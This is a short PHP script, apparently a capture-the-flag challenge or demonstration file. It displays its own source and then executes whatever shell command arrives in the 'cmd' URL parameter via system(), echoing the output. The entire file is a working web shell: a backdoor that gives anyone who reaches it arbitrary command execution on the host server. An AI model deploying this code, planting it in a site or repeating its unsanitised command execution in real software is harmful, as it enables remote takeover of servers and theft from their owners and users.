<?php

highlight_file(__FILE__);

$cmd = $_GET['cmd'];
if (isset($cmd)) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

?>